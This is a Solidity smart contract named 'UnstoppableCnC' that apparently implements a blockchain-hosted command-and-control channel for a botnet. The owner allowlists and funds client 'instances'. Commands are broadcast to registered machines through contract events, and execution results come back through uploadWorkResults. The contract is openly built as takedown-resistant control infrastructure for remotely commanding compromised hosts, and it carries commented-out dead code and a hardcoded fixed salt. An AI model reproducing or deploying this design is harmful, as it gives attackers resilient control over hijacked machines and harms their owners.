pragma solidity ^0.4.0;

contract UnstoppableCnC {
    
    address public owner;
    string public ownerPubKey;
    uint public creationTime;

	enum InstanceStates { NotExist, Inactive, Active, Disabled }

	struct Instance{
		bytes20 sessionId; //Hash of address + machineId + salt
		InstanceStates state; // default is NotExist
		uint256 funds;

	}
	
	event InstanceRegistered (address instance, bytes20 sessionId, uint256 fundsTransfered);
	
	event CommandPending (bytes32 indexed hashId, string command);
	
	event CommandResult (bytes32 indexed hashId, string commandResult);
	
	string constant NO_COMMAND = 'NA';
	
	/*
	struct CommandResult {
		bytes20 idHash;
		string command;
		string result;
	}
	*/
	
	mapping (address => Instance) public instances;

	//mapping (address => CommandResult) public commands;
	
	//CommandResult [] results;
	
	
	
	
	/*
		Constructor to init the contract. adds allowed addresses and a default command to execute upon connection
	*/
	function UnstoppableCnC (string pubkey, address[] addresses) 
	    public
	{
	    owner = msg.sender;
	    ownerPubKey = pubkey;
	    creationTime = now;
	    
		for (uint i = 0 ; i < addresses.length; i++){
			allowInstance(addresses[i]);
		}
	}
	
	
	modifier onlyBy(address _account){
        require(msg.sender == _account);
        _;
    }
    
    /* 
        Function with this modifier must provide the unique sessionId that match the approved sender address
        and must be in an activated state, by doing the one time registration process.
        
    */
    modifier onlyByValidInstance(bytes20 sessionId){
        require (instances[msg.sender].state == InstanceStates.Active && 
	            instances[msg.sender].sessionId == sessionId);
        _;
    }
    
    
	/*
		Registers a new instance to the CnC.

		machineId: A unique id identifying the hardware this instance is running on.
		
		returns sessionId: ripemd160(instanceId+machineId+Random)
		where instanceId == msg.sender, the address of the transaction.
		
		Once instance has been registered, it cannot be registered again with a different id, unless explicitly reset using allowInstance which can be called only by owner.
		sessionId must be sent on every request and reply in order to get a proper reply from the contract.
	*/
	function registerInstance(string machineId) public {
		require (instances[msg.sender].state == InstanceStates.Inactive); //Instance state must be inactive, meaning it was allowed and not activated yet and not disabled.
		
		string memory rnd = "abcd";//TODO create some randomness although it doesnt really matter...
		bytes20 sessionId = ripemd160(msg.sender , machineId, rnd);
		instances[msg.sender].state = InstanceStates.Active;
		instances[msg.sender].sessionId = sessionId;
		
		InstanceRegistered(msg.sender, sessionId,instances[msg.sender].funds);
		
		if (instances[msg.sender].funds > 0){
    		msg.sender.transfer(instances[msg.sender].funds);
    		instances[msg.sender].funds = 0;
		}
		//TODO: take machine info as a pending command result	
	}
	
	/**
		Methods for instances. this methods will execute for registered addresses only
	**/
	
	/*
		instances periodically call this function to check if there is a command waiting for them
		If command is received, instance shall not call this function until execution of the command is finished,
		and uploadWorkResults is called with result of that command.
		* if sender does not match with given sessionId, this function exits immediately
		
		sessionId: current sessionId for the instance
		returns: 
			command to execute, or null if nothing to do.
		
	
	function getWork (bytes20 sessionId) 
	    public view onlyByValidInstance(sessionId) 
	    returns (string) 
	{
		CommandResult storage cr = commands[msg.sender];
		if (cr.idHash > 0) //a command has been assigned
			return cr.command;
		else
			return NO_COMMAND; 
	}*/
	
	
	
	/*
		instances call this function to return the results of executed commands.
		Once returned, instance will be ready to receive its next command.
		sessionId: current sessionId for the instance
		result: is an object that contains the command's result, with some meta data.
	*/
	
	function uploadWorkResults (bytes20 sessionId, string result) 
	    public onlyByValidInstance(sessionId)
	    returns (bool)
	{
		/*CommandResult storage cr = commands[msg.sender];
		require (cr.idHash > 0); //There must be a pending command for this instance
		cr.result = result;
		results.push (cr);
		delete commands[msg.sender];
		*/
		
		bytes32 hashId = sha3(msg.sender);
		CommandResult(hashId, result);
		
		return true;
    }
		
	/**
		Methods for operator. this methods will execute for the contract owner only
	**/
	

	
	/*
		Adds an instance to allowed list.
		instances.add (instanceId, new instance)
	*/
	function allowInstance (address instanceId) 
	    public onlyBy(owner) payable returns (bool success) {
	   
	   instances[instanceId] = Instance({ sessionId: 0, state: InstanceStates.Inactive, funds: msg.value });
	   
	   //instanceId.transfer(100000000);
	
	   
	   return true;
	        
    }
	/*
		Revoke instance id access
		instances.remove (instanceId)
	*/
	function removeInstance (address instanceId) 
	    public onlyBy(owner) returns (bool success){
	        instances[instanceId].state = InstanceStates.Disabled;
	        return true;
	    }
	
	
	
	
	
	
	function addWork (address instanceId, string command) 
	    public onlyBy(owner) returns (bool) {
	    require (instances[instanceId].state == InstanceStates.Active);
	    //require (commands[instanceId].idHash == 0); //We can't add another command if another one's already pending
		
	    bytes32 hashId = sha3(instanceId);
	    //commands[instanceId] = CommandResult (hashId, command, "");
		CommandPending(hashId, command);
		
	    return true;
	}
	
	/*
	function fetchResults () 
	    public onlyBy(owner) returns (CommandResult [] res) {
	        res = results;
	        delete results;
	        return res;
    }
	*/
	/*
	event tempEvent (address indexed hashId, string command);
	
	function tempwork (address add, string c)
		public returns (bool){
			
			tempEvent(add, c);
		}
	
	
	function chargeInstance (address instanceId) 
	    public onlyBy(owner) {
	
	}
	*/
}